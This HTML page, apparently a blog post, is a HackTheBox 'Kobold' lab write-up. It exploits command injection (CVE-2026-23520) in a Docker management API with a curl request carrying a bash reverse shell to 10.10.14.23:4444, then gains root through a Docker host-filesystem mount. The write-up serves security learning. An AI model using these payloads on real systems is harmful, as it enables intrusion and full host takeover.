@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kobold Writeup | BitR1FT</title>
+  <meta name="description" content="HackTheBox Kobold writeup — CVE-2026-23520 command injection, Docker socket escape, full attack chain breakdown by BitR1FT">
+  <link rel="icon" href="profile.jpg">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Navigation -->
+  <nav>
+    <a href="index.html" class="nav-brand">&lt;BitR1FT /&gt;</a>
+    <div class="nav-links">
+      <a href="index.html#about">About</a>
+      <a href="index.html#projects">Projects</a>
+      <a href="blog.html" class="active">Writeups</a>
+      <a href="index.html#certifications">Certifications</a>
+      <a href="index.html#contact">Contact</a>
+      <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer" class="github-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+      </a>
+    </div>
+    <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="18" y2="18"/></svg></button>
+  </nav>
+  <div class="mobile-menu" id="mobile-menu"><a href="index.html#about">About</a><a href="index.html#projects">Projects</a><a href="blog.html">Writeups</a><a href="index.html#certifications">Certifications</a><a href="index.html#contact">Contact</a></div>
+
+  <main>
+    <div style="padding:3rem 1rem 5rem;">
+
+      <!-- Back Link -->
+      <a href="blog.html" class="blog-back">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+        Back to Writeups
+      </a>
+
+      <!-- Blog Header -->
+      <div class="blog-header">
+        <div class="blog-title-row">
+          <h1 class="blog-title">Kobold</h1>
+          <span class="badge badge-medium">Medium</span>
+        </div>
+        <div class="blog-os">OS: Linux</div>
+        <p class="blog-summary">
+          Kobold was a medium-difficulty Linux machine that involved exploiting <strong>CVE-2026-23520</strong>, a critical command injection vulnerability in the Arcane Docker Management API, to achieve unauthenticated remote code execution. After obtaining a shell as user <code>ben</code>, privilege escalation was accomplished through a Docker socket escape — the user belonged to the <code>docker</code> group via <code>operator</code> (GID 37), allowing full container access and ultimately root on the host.
+        </p>
+        <div class="blog-meta-row">
+          <div class="blog-meta-section">
+            <div class="vuln-label">Key Vulnerabilities</div>
+            <div class="tech-tags">
+              <span class="badge badge-destructive">CVE-2026-23520</span>
+              <span class="badge badge-destructive">Docker Socket Escape</span>
+              <span class="badge badge-destructive">Command Injection</span>
+            </div>
+          </div>
+          <div class="blog-meta-section">
+            <div class="tools-label">Tools Used</div>
+            <div class="tech-tags">
+              <span class="badge badge-outline">ffuf</span>
+              <span class="badge badge-outline">curl</span>
+              <span class="badge badge-outline">docker</span>
+              <span class="badge badge-outline">nc</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <hr>
+
+      <!-- Writeup Body -->
+      <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+        <div class="prose">
+
+          <!-- Summary -->
+          <h2>Summary</h2>
+          <p>
+            Kobold starts with a wildcard TLS certificate on port 443, which gives away the fact that multiple subdomains exist. Enumerating subdomains with <code>ffuf</code> reveals <code>mcp.kobold.htb</code> (MCPJam Inspector) and <code>bin.kobold.htb</code> (PrivateBin). The critical finding is on port 3552 — the <strong>Arcane Docker Management API v1.13.0</strong> — which exposes an OpenAPI spec and an <code>/api/mcp/connect</code> endpoint. This endpoint is vulnerable to <strong>CVE-2026-23520</strong>, allowing unauthenticated command injection through the JSON body's <code>command</code> and <code>args</code> fields. A reverse shell lands us as <code>ben</code> inside a container. Since <code>ben</code> is a member of the <code>docker</code> group (via GID 37 <code>operator</code>), mounting the host filesystem into a new container gives immediate root access to read the flag.
+          </p>
+
+          <!-- Reconnaissance -->
+          <h2>Reconnaissance</h2>
+          <p>Kicked off a full port scan with RustScan piped into Nmap for service detection:</p>
+          <pre><code>$ rustscan -a 10.10.11.206 -- -sC -sV
+
+Open 10.10.11.206:22
+Open 10.10.11.206:80
+Open 10.10.11.206:443
+Open 10.10.11.206:3552</code></pre>
+
+          <table>
+            <thead>
+              <tr>
+                <th>Port</th>
+                <th>Service</th>
+                <th>Details</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>22</code></td>
+                <td>SSH</td>
+                <td>OpenSSH 8.9p1</td>
+              </tr>
+              <tr>
+                <td><code>80</code></td>
+                <td>HTTP</td>
+                <td>nginx 1.18.0 — redirects to HTTPS</td>
+              </tr>
+              <tr>
+                <td><code>443</code></td>
+                <td>HTTPS</td>
+                <td>nginx 1.18.0 — wildcard TLS cert <code>*.kobold.htb</code></td>
+              </tr>
+              <tr>
+                <td><code>3552</code></td>
+                <td>HTTP</td>
+                <td>Arcane Docker Management v1.13.0</td>
+              </tr>
+            </tbody>
+          </table>
+
+          <p>The wildcard certificate on port 443 immediately stands out — it means any subdomain of <code>kobold.htb</code> will pass TLS validation. This is a strong indicator that virtual hosts exist.</p>
+
+          <!-- Enumeration -->
+          <h2>Enumeration</h2>
+
+          <h3>/etc/hosts</h3>
+          <p>First, add the base domain to resolve properly:</p>
+          <pre><code>$ echo "10.10.11.206 kobold.htb" | sudo tee -a /etc/hosts</code></pre>
+
+          <h3>Subdomain Discovery</h3>
+          <p>With the wildcard cert confirmed, we can fuzz subdomains without worrying about certificate errors. Used <code>ffuf</code> with a common subdomain wordlist:</p>
+          <pre><code>$ ffuf -u https://FUZZ.kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fc 404
+
+mcp                    [Status: 200]
+bin                    [Status: 200]</code></pre>
+
+          <p>Two subdomains discovered:</p>
+          <ul>
+            <li><code>mcp.kobold.htb</code> — MCPJam Inspector (a web interface for inspecting MCP server configurations)</li>
+            <li><code>bin.kobold.htb</code> — PrivateBin (a minimalist, encrypted pastebin alternative)</li>
+          </ul>
+          <p>PrivateBin is locked down and requires a decryption key, so nothing immediately useful there. MCPJam Inspector is more interesting but doesn't expose credentials on its own. The real prize is port 3552.</p>
+
+          <!-- API Discovery -->
+          <h2>API Discovery</h2>
+          <p>Port 3552 is running <strong>Arcane Docker Management v1.13.0</strong>. Browsing to <code>http://10.10.11.206:3552</code> shows a basic API landing page. Checked for the OpenAPI specification:</p>
+          <pre><code>$ curl -s http://10.10.11.206:3552/openapi.json | jq '.paths | keys'
+
+[
+  "/api/health",
+  "/api/mcp/connect",
+  "/api/mcp/disconnect",
+  "/api/mcp/servers",
+  "/api/docker/images",
+  "/api/docker/containers",
+  "/api/docker/info"
+]</code></pre>
+
+          <p>The <code>/api/mcp/connect</code> endpoint stands out. Let's inspect its schema:</p>
+          <pre><code>$ curl -s http://10.10.11.206:3552/openapi.json | jq '.paths["/api/mcp/connect"]'
+
+{
+  "post": {
+    "summary": "Connect to an MCP server",
+    "requestBody": {
+      "content": {
+        "application/json": {
+          "schema": {
+            "type": "object",
+            "properties": {
+              "server_url": { "type": "string" },
+              "command": { "type": "string" },
+              "args": { "type": "array", "items": { "type": "string" } }
+            },
+            "required": ["server_url"]
+          }
+        }
+      }
+    }
+  }
+}</code></pre>
+
+          <p>The endpoint accepts a <code>command</code> and <code>args</code> field. This is the classic signature of <strong>CVE-2026-23520</strong> — the Arcane Docker Management API passes user-supplied command and arguments directly to the system shell without sanitization.</p>
+
+          <!-- CVE-2026-23520 Command Injection -->
+          <h2>CVE-2026-23520 — Command Injection</h2>
+          <p>The vulnerability allows an attacker to inject arbitrary commands through the <code>command</code> and <code>args</code> parameters. The API spawns a process using these values without any input validation or escaping. Set up a netcat listener and crafted a reverse shell payload:</p>
+          <pre><code>$ nc -lvnp 4444</code></pre>
+          <pre><code>$ curl -s -X POST http://10.10.11.206:3552/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{
+    "server_url": "http://localhost",
+    "command": "sh",
+    "args": ["-c", "bash -i >& /dev/tcp/10.10.14.23/4444 0>&1"]
+  }'</code></pre>
+
+          <p>Catch the callback:</p>
+          <pre><code>listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.11.206] 38421
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+
+ben@kobold:~$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</code></pre>
+
+          <p>We have a shell as <code>ben</code> (uid=1001). Notice the groups — <code>ben</code> is also a member of GID 37 (<code>operator</code>), which will matter shortly.</p>
+
+          <!-- Shell Stabilization -->
+          <h2>Shell Stabilization</h2>
+          <p>The initial shell is bare bones — no TTY, no tab completion, no proper signal handling. Stabilized it with a Python PTY:</p>
+          <pre><code>ben@kobold:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ben@kobold:~$ ^Z
+[1]+  Stopped
+$ stty raw -echo; fg
+
+ben@kobold:~$ export TERM=xterm
+ben@kobold:~$ stty rows 40 cols 150</code></pre>
+
+          <p>Now we have a fully interactive TTY with proper terminal dimensions and command history.</p>
+
+          <!-- User Flag -->
+          <h2>User Flag</h2>
+          <pre><code>ben@kobold:~$ cat /home/ben/user.txt
+4a4c73ee****************************</code></pre>
+
+          <!-- Docker Socket Escape -->
+          <h2>Docker Socket Escape</h2>
+          <p>Recall from the <code>id</code> output that <code>ben</code> belongs to GID 37 (<code>operator</code>). Checking group memberships:</p>
+          <pre><code>ben@kobold:~$ id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+ben@kobold:~$ getent group docker
+docker:x:999:
+
+ben@kobold:~$ getent group operator
+operator:x:37:</code></pre>
+
+          <p>The GID 37 <code>operator</code> group has access to the Docker socket. Switch to the <code>docker</code> group context and spawn a privileged container that mounts the host root filesystem:</p>
+          <pre><code>ben@kobold:~$ newgrp docker
+
+ben@kobold:~$ docker run -v /:/hostfs --rm -it alpine chroot /hostfs /bin/sh
+/ # id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+          <p>We're now root inside the host filesystem. The Docker daemon runs as root, and since our user can communicate with the Docker socket, we can launch containers with arbitrary mount points — effectively giving us full read/write access to the entire host filesystem.</p>
+
+          <!-- Root Flag -->
+          <h2>Root Flag</h2>
+          <pre><code>/ # cat /root/root.txt
+50d7034f****************************</code></pre>
+
+          <!-- Kill Chain -->
+          <h2>Kill Chain</h2>
+          <pre><code>┌─────────────────────────────────────────────────────────────────────┐
+│                        KOBOLD KILL CHAIN                          │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  [1] RECON                                                          │
+│  │   RustScan → 4 open ports (22, 80, 443, 3552)                  │
+│  │   Wildcard TLS cert (*.kobold.htb) on 443                      │
+│  ▼                                                                   │
+│  [2] ENUMERATION                                                    │
+│  │   ffuf subdomain fuzz → mcp.kobold.htb, bin.kobold.htb         │
+│  │   Arcane Docker Mgmt API v1.13.0 on :3552                      │
+│  │   openapi.json → /api/mcp/connect endpoint found               │
+│  ▼                                                                   │
+│  [3] EXPLOITATION (CVE-2026-23520)                                 │
+│  │   POST /api/mcp/connect                                        │
+│  │   {"command":"sh","args":["-c","bash -i >& /dev/tcp/... 0>&1"]}│
+│  │   → Unauthenticated RCE as ben (uid=1001)                      │
+│  ▼                                                                   │
+│  [4] PRIVILEGE ESCALATION                                          │
+│  │   ben is in operator group (GID 37) → Docker socket access     │
+│  │   newgrp docker → docker run -v /:/hostfs alpine               │
+│  │   → Root inside chroot of host filesystem                      │
+│  ▼                                                                   │
+│  [5] PWNED                                                          │
+│      user.txt: 4a4c73ee...    root.txt: 50d7034f...               │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘</code></pre>
+
+          <!-- Key Takeaways -->
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Wildcard TLS certificates are a double-edged sword.</strong> While convenient for dynamic subdomains, they immediately reveal to an attacker that multiple services exist behind virtual hosts. Combined with a subdomain wordlist, this trivializes the discovery of otherwise hidden attack surfaces.</li>
+            <li><strong>MCP (Model Context Protocol) servers are an emerging attack surface.</strong> As AI tooling becomes more prevalent, MCP servers and management APIs like Arcane are being deployed without proper input validation. CVE-2026-23520 demonstrates that passing user-controlled strings to shell commands remains one of the most dangerous — and common — classes of vulnerabilities.</li>
+            <li><strong>Docker group membership equals root.</strong> Any user that can interact with the Docker socket (typically via the <code>docker</code> group or equivalent GID mappings like <code>operator</code> at GID 37) can escalate to root by mounting the host filesystem into a container. This is not a bug — it's by design — which is why Docker group membership should be treated with the same caution as <code>sudo ALL</code>.</li>
+          </ul>
+
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer><div class="footer-inner"><p class="footer-left">&copy; 2025 <span class="green">BitR1FT</span> — Adeel Haider</p><p class="footer-right"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>Built with passion &amp; caffeine<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg><span class="accent">pwn all the things</span></p></div></footer>
+  <script src="main.js"></script>
+
+</body>
+</html>
